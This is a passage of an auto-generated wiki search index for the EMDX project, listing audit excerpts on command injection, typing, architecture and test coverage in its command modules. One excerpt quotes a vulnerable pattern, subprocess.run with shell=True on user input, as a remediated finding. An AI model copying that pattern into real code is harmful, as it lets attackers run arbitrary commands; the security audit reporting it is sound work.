\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=5.3)</li> <li><code>\u2705 what's working well</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=5.3)</li> <li><code>type safety benefits</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=5.3)</li> <li><code>standard fish plugin structure</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=5.3)</li> <li><code>speed</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=5.3)</li> <li><code>short-term goals (2 weeks)</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=5.3)</li> <li><code>shell support</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=5.3)</li> <li><code>search enhancements</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=5.3)</li> <li><code>rich content support</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=5.3)</li> <li><code>recent additions</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=5.3)</li> </ul>"},{"location":"entities/command-injection/","title":"command injection","text":"<p>Type: heading | Mentioned in: 22 documents | First seen: 2026-02-14</p>"},{"location":"entities/command-injection/#documents-22","title":"Documents (22)","text":"<ul> <li> <p>#6728 Wiki Generation Architecture Research [6/10]   Section: Recommendation: Three-Tier Scoring with Noise Filtering</p> Category Count Example CLEAN 532 <code>command injection</code>, <code>emdx delegate</code> PY_FILE 173 <code>delegate.py</code>, <code>tasks.py</code> FILE_PATH 115 <code>emdx/commands/delegate.py</code> FUNC_CALL 53 <code>_run_discovery()</code>, `shlex.spl... </li> <li> <p>#6465 Security Audit and Fixes: EMDX Command Injection Vulnerability   Section: Executive Summary</p> <p>A comprehensive security audit of the EMDX project identified a critical command injection vulnerability in the <code>delegate --each</code> feature. This vulnerability allowed arbitrary command execution through shell injection and has been successfully remediated...</p> </li> <li> <p>#6283 Delegate synthesis [synthesis]   Section: 1. CRITICAL Security Vulnerability Fixed (PR #484, #494)</p> <p>Command Injection in <code>delegate --each</code> - The most severe finding:</p> </li> <li><code>subprocess.run(command, shell=True)</code> allowed arbitrary command execution</li> <li> <p>Fix: Command allowlist + `shlex.split...</p> </li> <li> <p>#6276 Delegate: DEBT-1: Fix command injection vulnerability in emdx/commands   Section: Summary</p> <p>Fixed a command injection vulnerability (DEBT-1) in <code>emdx/commands/delegate.py</code> where the <code>_run_discovery()</code> function used <code>shell=True</code> with user input from the <code>--each</code> flag, enabling arbitrary command execution.</p> </li> <li> <p>#6272 Delegate: Document #6230 (Delegate: Audit SECURITY DEBT in the emdx pr [36/37]   Section: Summary</p> <p>Fixed a critical command injection vulnerability (CVE-level severity) in the <code>emdx delegate --each</code> flag, as identified in security audit document #6230.</p> </li> <li> <p>#6270 Security Fix: Command Injection in delegate --each   Section: Summary</p> <p>Fixed a critical command injection vulnerability in the <code>emdx delegate --each</code> feature and added defense-in-depth for SQL column name interpolation in migrations.</p> </li> <li> <p>#6267 Delegate: Document #6230 (Delegate: Audit SECURITY DEBT in the emdx pr [32/37]   Section: Summary</p> <p>Fixed CRITICAL command injection vulnerability in the <code>_run_discovery()</code> function in <code>emdx/commands/delegate.py</code>.</p> </li> <li> <p>#6263 Delegate: Document #6230 (Delegate: Audit SECURITY DEBT in the emdx pr [28/37]   Section: Summary</p> <p>Fixed the critical command injection vulnerability identified in the security audit. The <code>--each</code> flag in <code>emdx delegate</code> previously passed user input directly to a shell subprocess (<code>shell=True</code>), enabling arbitrary command execution.</p> </li> <li> <p>#6260 Delegate: Document #6230 (Delegate: Audit SECURITY DEBT in the emdx pr [26/37]   Section: Summary</p> <p>Fixed the CRITICAL command injection vulnerability identified in security audit document #6230.</p> </li> <li> <p>#6258 Delegate: Document #6230 (Delegate: Audit SECURITY DEBT in the emdx pr [24/37]   Section: Summary</p> <p>Fixed a critical command injection vulnerability in the <code>emdx delegate --each</code> feature.</p> </li> <li> <p>#6257 Delegate: Document #6230 (Security Fix Implementation)   Section: Summary</p> <p>Implemented the critical security fix identified in Document #6230 (Security Audit Report) for the command injection vulnerability in <code>emdx delegate --each</code>.</p> </li> <li> <p>#6255 Delegate: Document #6230 (Delegate: Audit SECURITY DEBT in the emdx pr [20/37]   Section: Summary</p> <p>Fixed a HIGH severity command injection vulnerability in the <code>delegate --each</code> flag, identified in Security Audit Document #6230.</p> </li> <li> <p>#6253 Delegate: Fix command injection vulnerability in delegate --each   Section: Summary</p> <p>Fixed a CRITICAL command injection vulnerability in the <code>delegate --each</code> feature identified in Document #6230 (Security Audit).</p> </li> <li> <p>#6251 Delegate: Document #6230 (Delegate: Audit SECURITY DEBT in the emdx pr [16/37]   Section: Summary</p> <p>Fixed the CRITICAL command injection vulnerability identified in security audit document #6230.</p> </li> <li> <p>#6250 Delegate: Security Fix - Command Injection in --each   Section: Summary</p> <p>Fixed the critical command injection vulnerability identified in Document #6230 (Security Audit).</p> </li> <li> <p>#6242 Delegate: Document #6230 (Delegate: Audit SECURITY DEBT in the emdx pr [8/37]   Section: Summary</p> <p>Fixed CRITICAL command injection vulnerability in <code>emdx delegate --each</code> feature.</p> </li> <li> <p>#6241 Delegate: Document #6230 (Delegate: Audit SECURITY DEBT in the emdx pr [10/37]   Section: Summary</p> <p>Successfully fixed the CRITICAL command injection vulnerability identified in the security audit (Document #6230).</p> </li> <li> <p>#6240 Delegate: Document #6230 (Delegate: Audit SECURITY DEBT in the emdx pr [4/37]   Section: Summary</p> <p>Fixed critical command injection vulnerability in <code>emdx delegate --each</code> identified in document #6230 (Security Audit Report).</p> </li> <li> <p>#6238 Delegate: Document #6230 (Delegate: Audit SECURITY DEBT in the emdx pr [6/37]   Section: Security Fix: Command Injection in Delegate Discovery</p> <p>Issue: CRITICAL - The <code>--each</code> flag in <code>emdx delegate</code> was vulnerable to command injection due to using <code>shell=True</code> with user-provided input.</p> </li> <li> <p>#6230 Delegate: Audit SECURITY DEBT in the emdx project: Check for SQL injec [5/14]   Section: EMDX Security Audit Report</p> <p>Date: 2026-02-14 Scope: SQL injection, command injection, path traversal, credential handling, unsafe deserialization, input sanitization</p> </li> </ul>"},{"location":"entities/command-injection/#related-entities","title":"Related Entities","text":"<ul> <li><code>security fix: command injection in delegate --each</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (12 shared docs, PMI=5.3)</li> <li><code>before (vulnerable)</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (6 shared docs, PMI=5.3)</li> <li><code>testvalidatediscoverycommand</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (5 shared docs, PMI=5.3)</li> <li><code>overall security posture</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (5 shared docs, PMI=5.3)</li> <li><code>after (secure)</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (5 shared docs, PMI=5.3)</li> <li><code>vulnerability</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (4 shared docs, PMI=5.3)</li> <li><code>overall security posture:</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (4 shared docs, PMI=5.3)</li> <li><code>delegate discovery</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (4 shared docs, PMI=5.3)</li> <li><code>security fix: command injection in delegate discovery</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=5.3)</li> <li><code>risk assessment update</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=5.3)</li> </ul>"},{"location":"entities/commands/","title":"commands/","text":"<p>Type: tech_term | Mentioned in: 10 documents | First seen: 2026-02-14</p>"},{"location":"entities/commands/#documents-10","title":"Documents (10)","text":"<ul> <li> <p>#6863 Delegate: Audit docs/ folder: Read docs/cli-api.md, docs/architecture. [3/3]   Section: docs/cli-api.md</p> <p>.... None of these exist. The <code>group</code> subcommand is not registered in <code>main.py</code>. The <code>commands/groups.py</code> file doesn't exist, <code>database/groups.py</code> doesn't exist, and <code>services/group_service.py</code> doesn't exist.</p> </li> <li> <p>#6578 Delegate: List all TypedDicts defined in emdx/ and count how many file   Section: All 45 TypedDicts (by location)</p> </li> <li> <p><code>DistillDocumentDict</code> (no)</p> </li> <li> <p>#6470 Comprehensive Any/None Typing Audit Report for EMDX   Section: Executive Summary</p> <p>This audit analyzed the EMDX codebase across three major directories (<code>commands/</code>, <code>services/</code>, and <code>ui/</code>) to identify opportunities for replacing generic <code>Any</code> type annotations with more specific types. The goal is to improve type safety, code m...</p> </li> <li> <p>#6327 Delegate: analysis,architecture [7/10]   Section: Layer Structure (Current)</p> <p>``` \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510 \u2502 commands/         CLI entry points (Typer)                  \u2502 \u2502 \u251c\u2500\u2500 core.py       (876 lines) save, find, view, edit, delete\u2502 \u2502 \u251c\u2500\u2500 maintain.py   (1098 lines) maintenance oper...</p> </li> <li> <p>#6324 Delegate: Architecture Improvement Analysis v0.14.0 [9/10]   Section: 1. Architectural Strengths</p> </li> <li>Layered Architecture: Clean separation between <code>commands/</code>, <code>services/</code>, <code>database/</code>, <code>models/</code>, and <code>ui/</code></li> <li>Lazy Loading: Heavy commands (cascade, delegate, AI) use lazy imports for fast CLI startup</li> <li> <p>**Strategy Patter...</p> </li> <li> <p>#6316 Delegate: Comprehensive Codebase Quality Analysis [15/15]   Section: \u2705 Strengths</p> <p>...t commits show consistent refactoring</p> </li> <li>Good Architecture \u2014 Clear separation: commands/, services/, ui/, database/</li> <li>Documentation \u2014 10 markdown docs covering architecture, CLI, setup</li> <li> <p>Modern Tooling \u2014 Poetry, pytest, black, ruff, mypy config...</p> </li> <li> <p>#6314 Delegate: analysis,architecture,active [13/15]   Section: Core Architecture Layers</p> </li> <li><code>core.py</code>: save, find, view, edit, delete</li> <li><code>browse.py</code>: list, recent, stats</li> <li> <p><code>tags.py</code>: tag add/remove/list/rename/merge/batch...</p> </li> <li> <p>#6307 Delegate: Analyze ERROR HANDLING PATTERNS across emdx/ (exclude ui/ an [6/15]   Section: Module-by-Module Analysis</p> Module Score Notes <code>commands/</code> 8/10 Excellent typer.Exit usage, good exception chaining <code>services/</code> 7/10 Good fallback patterns, some overly broad catches <code>utils/</code> 7/10 Consis... </li> <li> <p>#6306 Delegate: Analyze SEPARATION OF CONCERNS across emdx/ (exclude ui/ and [5/15]   Section: Layer Architecture Overview</p> <p>...(Claimed) | Purpose (Actual) | |-------|-------------------|------------------| | <code>commands/</code> | CLI handlers | CLI + presentation + some business logic | | <code>models/</code> | Domain models | Database access layer (VIOLATION) | | <code>database/</code> | Database operation...</p> </li> </ul>"},{"location":"entities/commands/#commandsdistillpy-1-typeddict","title":"<code>commands/distill.py</code> \u2014 1 TypedDict","text":""},{"location":"entities/commands/#what-works-well","title":"What Works Well","text":""},{"location":"entities/commands/#2-command-layer-commands","title":"2. Command Layer (<code>commands/</code>)","text":"<p>Eager (fast, always loaded):</p>"},{"location":"entities/commands/#related-entities","title":"Related Entities","text":"<ul> <li><code>total python</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (4 shared docs, PMI=6.4)</li> <li><code>worst offenders by</code>dict[str, any]<code>count:</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.4)</li> <li><code>what's good</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.4)</li> <li><code>ui/keybindings/config.py</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.4)</li> <li><code>type safety coverage audit</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.4)</li> <li><code>toolcallmessage</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.4)</li> <li><code>tool_uses</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.4)</li> <li><code>thinkingmessage</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.4)</li> <li><code>tasks_completed: list[dict[str, any]]</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.4)</li> <li><code>systemmessage</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.4)</li> </ul>"},{"location":"entities/commandsanalyzepy/","title":"commands/analyze.py","text":"<p>Type: tech_term | Mentioned in: 8 documents | First seen: 2026-02-14</p>"},{"location":"entities/commandsanalyzepy/#documents-8","title":"Documents (8)","text":"<ul> <li>#6578 Delegate: List all TypedDicts defined in emdx/ and count how many file   Section: By layer: </li> <li><code>commands/analyze.py</code> \u2014 14 occurrences</li> <li><code>commands/briefing.py</code> \u2014 13 occurrences</li> <li><code>utils/structured_logger.py</code> \u2014 10 occurrences</li> <li> <p><code>commands/prime.py</code> \u2014 9 occurrences 5....</p> </li> <li> <p>#6563 Delegate: Document #6418 (Type System Audit: Replace Any/None with Con   Section: Files Changed</p> <ul> <li><code>emdx/commands/types.py</code> (new, 259 lines)</li> </ul> </li> <li><code>emdx/commands/prime.py</code> (modified)</li> <li><code>emdx/commands/analyze.py</code> (modified)</li> <li> <p><code>emdx/commands/delegate.py</code> (modified)</p> </li> <li> <p>#6319 Codebase Quality Analysis \u2014 Synthesized Summary (2026-02-14)   Section: Tier 1: Architecture Issues (High Impact)</p> <p>...ories, not domain models. Rename to <code>repositories/</code> or merge into <code>database/</code> | | <code>commands/analyze.py</code> has 700+ lines of business logic | HIGH | Health calculations, duplicate detection, tag analysis mixed with CLI presentation. Extract to `services/analysis_service....</p> </li> <li> <p>#6306 Delegate: Analyze SEPARATION OF CONCERNS across emdx/ (exclude ui/ and [5/15]   Section: 2. HIGH: <code>commands/analyze.py</code> Contains 700+ Lines of Business Logic**</p> <p>File: <code>commands/analyze.py</code> (744 lines)</p> </li> <li> <p>#6236 Delegate: Audit TESTING DEBT in the emdx project: Find untested public [10/14]   Section: 1. MODULES WITH 0% TEST COVERAGE (CRITICAL)</p> <p>...tions | Recommended Test | |--------|----------|-----------|------------------| | <code>commands/analyze.py</code> | \ud83d\udd34 CRITICAL | 15 public functions | Integration tests for <code>emdx maintain analyze</code> with all flags | | <code>commands/ask.py</code> | \ud83d\udd34 CRITICAL | 7 public functions | Test `as...</p> </li> <li> <p>#6234 Delegate: Tech Debt Category Audit 2026-02-14 [14/14]   Section: CATEGORY 2: Type Safety &amp; Static Analysis</p> <p>...vement (67% reduction)</p> </li> <li> <p>Remaining hotspots: <code>utils/structured_logger.py</code> (10), <code>commands/analyze.py</code> (6)</p> </li> <li> <p>363 uses of <code>Optional[...]</code> across 72 files</p> </li> <li>Indicates proper null handling in most cases</li> <li> <p>Some may benefit from stricter non-null types</p> </li> <li> <p>#6222 Delegate: Audit TESTING DEBT in the emdx project: Find untested public [10/14]   Section: Commands (High Priority)</p> <p>...rity | Recommended Tests | |--------|----------|----------|-------------------| | <code>commands/analyze.py</code> | <code>analyze()</code> with all flags (--health, --duplicates, --similar, --empty, --tags, --projects, --json) | HIGH | Test each analysis mode with populated and empty DB,...</p> </li> </ul>"},{"location":"entities/commandsanalyzepy/#worst-offenders-by-dictstr-any-count","title":"Worst offenders by <code>dict[str, Any]</code> count:","text":""},{"location":"entities/commandsanalyzepy/#related-entities","title":"Related Entities","text":"<ul> <li><code>tagsdata</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=6.7)</li> <li><code>similardata</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=6.7)</li> <li><code>projectsdata</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=6.7)</li> <li><code>healthdata</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=6.7)</li> <li><code>emptydata</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=6.7)</li> <li><code>duplicatesdata</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=6.7)</li> <li><code>_get_active_epics()</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=6.7)</li> <li><code>worst offenders by</code>dict[str, any]<code>count:</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.7)</li> <li><code>what's good</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.7)</li> <li><code>ui/keybindings/config.py</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.7)</li> </ul>"},{"location":"entities/commandscorepy/","title":"commands/core.py","text":"<p>Type: tech_term | Mentioned in: 10 documents | First seen: 2026-01-14</p>"},{"location":"entities/commandscorepy/#documents-10","title":"Documents (10)","text":"<ul> <li>#6611 Emoji alias removal: synthesis   Section: Actionable Items <p>.... Simplify <code>models/tags.py</code> \u2014 remove all 6 alias/normalize call sites</p> </li> <li>Simplify <code>commands/core.py</code> \u2014 remove all 5 <code>expand_alias_string</code> calls</li> <li>Update <code>auto_tagger.py</code>, <code>ask_service.py</code>, <code>unified_search.py</code> (1 change each)</li> <li> <p>Rewrite <code>formatting.py:order_tags()</code>...</p> </li> <li> <p>#6610 Delegate: Search the entire emdx codebase for every import or referenc [2/2]   Section: 3. <code>expand_alias_string</code> (function)</p> <p>...-|------|-------| | <code>emdx/utils/emoji_aliases.py</code> | 152 | Definition | | <code>emdx/commands/core.py</code> | 39 | Import: <code>from emdx.utils.emoji_aliases import expand_alias_string</code> | | <code>emdx/commands/core.py</code> | 155 | Usage: Tag expansion during save | | `emdx/com...</p> </li> <li> <p>#6324 Delegate: Architecture Improvement Analysis v0.14.0 [9/10]   Section: 2.5 Large File Decomposition (Medium Priority)</p> <p>...it | | <code>commands/maintain.py</code> | 1098 | Group related commands into submodules | | <code>commands/core.py</code> | 876 | Extract input handling helpers |</p> </li> <li> <p>#6316 Delegate: Comprehensive Codebase Quality Analysis [15/15]   Section: File Complexity Analysis</p> <p>...browser component | | <code>commands/maintain.py</code> | 1,097 | Maintenance operations | | <code>commands/core.py</code> | 876 | Core CRUD commands |</p> </li> <li> <p>#6312 Delegate: Analyze MODULE BOUNDARIES &amp; COUPLING across emdx/ (exclude u [4/15]   Section: Commands Bypassing Services (7 files)</p> <p>...------------|----------------------| | <code>commands/browse.py</code> | <code>emdx.database</code> | | <code>commands/core.py</code> | <code>emdx.database</code>, <code>emdx.database.documents</code> | | <code>commands/gist.py</code> | <code>emdx.database</code> | | <code>commands/groups.py</code> | <code>emdx.database</code>, <code>emdx.database.groups</code> | | `comman...</p> </li> <li> <p>#6311 Delegate: Analyze DEAD CODE &amp; DUPLICATION across emdx/ (exclude ui/ an [8/15]   Section: 1. MAJOR DUPLICATION: git.py vs git_ops.py (HIGH PRIORITY)</p> </li> <li>git.py is used by: <code>commands/core.py</code>, <code>commands/delegate.py</code>, <code>commands/prime.py</code>, <code>ui/activity/activity_view.py</code>, <code>ui/document_browser.py</code>, <code>ui/presenters/document_browser_presenter.py</code></li> <li> <p>**git_ops.py...</p> </li> <li> <p>#6309 Delegate: Analyze FUNCTION COMPLEXITY across emdx/ (exclude ui/ and tests/)   Section: Top 15 Worst Offenders (Ranked by Severity)</p> <p>...much: validation, subprocess, output parsing, heartbeat | | 113.9 | 229 | 5 | <code>commands/core.py:340</code> | <code>find()</code> | 30 conditionals, complex tag/search/date filter combinations | | 102.1 | 96 | 9 | <code>services/unified_executor.py:41</code> | <code>format_stream_line()</code> |...</p> </li> <li> <p>#6236 Delegate: Audit TESTING DEBT in the emdx project: Find untested public [10/14]   Section: 3. MISSING EDGE CASE TESTS</p> <p>...LI Commands | Module | Edge Case | Severity | |--------|-----------|----------| | <code>commands/core.py</code> | Save with binary file input | \ud83d\udfe1 HIGH | | <code>commands/core.py</code> | Find with regex metacharacters | \ud83d\udfe1 HIGH | | <code>commands/delegate.py</code> | Parallel execution with all tas...</p> </li> <li> <p>#6234 Delegate: Tech Debt Category Audit 2026-02-14 [14/14]   Section: CATEGORY 3: Code Organization &amp; Complexity</p> <p>...decomposition | | <code>commands/maintain.py</code> | 1,097 | Needs decomposition** | | <code>commands/core.py</code> | 876 | Consider splitting | | <code>commands/cascade.py</code> | 754 | Consider splitting | | <code>utils/git_ops.py</code> | 752 | Consider splitting | | <code>commands/analyze.py</code> | 743 |...</p> </li> <li> <p>#4894 Parallel Analysis (Reusable) - Parallel_Explore Synthesis   Section: Theme 4: Large Files Indicating Architectural Strain</p> <p>...strings | | <code>document_browser.py</code> | 1,147 | Mixed UI/business logic, no tests | | <code>commands/core.py</code> | 1,082 | Many command handlers, inconsistent error patterns |</p> </li> </ul>"},{"location":"entities/commandscorepy/#usage-analysis","title":"Usage Analysis","text":""},{"location":"entities/commandscorepy/#related-entities","title":"Related Entities","text":"<ul> <li><code>tag system emojis</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.4)</li> <li><code>services/document_service.py</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.4)</li> <li><code>large file decomposition</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.4)</li> <li><code>expand_alias_string</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.4)</li> <li><code>ui/search/search_screen.py</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=6.0)</li> <li><code>commands/cascade.py</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=6.0)</li> <li><code>ui/document_browser.py</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (5 shared docs, PMI=5.9)</li> <li><code>ui/activity/activity_view.py</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (5 shared docs, PMI=5.9)</li> <li><code>services/tag_service.py</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=5.8)</li> <li><code>services/group_service.py</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=5.8)</li> </ul>"},{"location":"entities/commandsdelegatepy/","title":"commands/delegate.py","text":"<p>Type: heading | Mentioned in: 8 documents | First seen: 2026-02-14</p>"},{"location":"entities/commandsdelegatepy/#documents-8","title":"Documents (8)","text":"<ul> <li> <p>#6236 Delegate: Audit TESTING DEBT in the emdx project: Find untested public [10/14]   Section: 2. UNTESTED PUBLIC FUNCTIONS IN EXISTING MODULES</p> </li> <li> <p>#6872 Delegate: Document #6864 (Delegate synthesis [synthesis]):</p> </li> </ul>"},{"location":"entities/commandsdelegatepy/#commandsdelegatepy_1","title":"commands/delegate.py","text":"<p>Test file exists but only covers <code>_slugify_title</code> and <code>_resolve_task</code>.</p>"},{"location":"entities/commandsdelegatepy/#synthes-34","title":"Synthes [3/4]","text":"<p>Section: 1. <code>emdx/config/constants.py</code> \u2014 38 dead constants</p> <p>...T_MAX_SUGGESTIONS<code>|</code>services/auto_tagger.py<code>| |</code>DELEGATE_EXECUTION_TIMEOUT<code>|</code>commands/delegate.py<code>| |</code>TRASH_CLEANUP_DAYS<code>| re-exported only (may be used by external config) | |</code>BRANCH_CLEANUP_DAYS<code>| re-exported only | |</code>EXECUTION_HISTORY_DAYS` | re-exported...</p> <ul> <li>#6563 Delegate: Document #6418 (Type System Audit: Replace Any/None with Con   Section: Files Changed <ul> <li><code>emdx/commands/types.py</code> (new, 259 lines)</li> </ul> </li> <li><code>emdx/commands/prime.py</code> (modified)</li> <li><code>emdx/commands/analyze.py</code> (modified)</li> <li> <p><code>emdx/commands/delegate.py</code> (modified)</p> </li> <li> <p>#6532 EMDX Future Directions: Agent-First Design [3/4]   Section: What Works Well</p> <ol> <li>Parallel Execution (<code>commands/delegate.py</code>)</li> </ol> </li> <li>ThreadPoolExecutor with configurable concurrency (<code>-j</code>)</li> <li>Synthesis option for combining outputs</li> <li> <p>Result aggregation with failure tracking</p> </li> <li> <p>#6324 Delegate: Architecture Improvement Analysis v0.14.0 [9/10]   Section: 2.6 Inconsistent Error Handling (Low Priority)</p> <p>Current State: Mixed patterns in commands:</p> </li> <li><code>commands/core.py</code>: try/except with <code>raise typer.Exit(1)</code></li> <li> <p><code>commands/delegate.py</code>: <code>_safe_*</code> wrappers that never fail</p> </li> <li> <p>#6311 Delegate: Analyze DEAD CODE &amp; DUPLICATION across emdx/ (exclude ui/ an [8/15]   Section: 1. MAJOR DUPLICATION: git.py vs git_ops.py (HIGH PRIORITY)</p> </li> <li>git.py is used by: <code>commands/core.py</code>, <code>commands/delegate.py</code>, <code>commands/prime.py</code>, <code>ui/activity/activity_view.py</code>, <code>ui/document_browser.py</code>, <code>ui/presenters/document_browser_presenter.py</code></li> <li> <p>git_ops.py is documented but **O...</p> </li> <li> <p>#6309 Delegate: Analyze FUNCTION COMPLEXITY across emdx/ (exclude ui/ and tests/)   Section: Top 15 Worst Offenders 